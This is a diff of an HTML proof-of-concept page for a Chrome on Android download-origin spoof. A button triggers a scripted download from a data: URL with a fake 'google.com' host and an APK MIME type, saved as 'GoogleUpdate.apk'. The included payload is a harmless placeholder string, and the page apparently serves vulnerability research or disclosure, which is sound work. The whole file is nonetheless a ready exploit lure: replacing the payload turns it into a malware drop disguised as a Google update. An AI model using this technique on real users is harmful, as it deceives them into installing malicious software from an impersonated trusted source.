@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirect to example.com PoC</title>
+  <title>Chrome Android Origin Spoof PoC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -22,16 +22,20 @@
 </head>
 
 <body>
-  <h2>Redirect → Download</h2>
-  <p>Tap Download</p>
+  <h2>Download Origin Spoof PoC</h2>
+  <p>Tap the button below</p>
 
-  <button onclick="go()">Download</button>
+  <button onclick="download()">Download</button>
 
   <script>
-    function go() {
-      // REAL redirect: address bar becomes data://example.com/...
-      window.location.href =
-        "data://example.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+    function download() {
+      const a = document.createElement("a");
+      a.href =
+        "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+      a.download = "GoogleUpdate.apk";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
     }
   </script>
 </body>
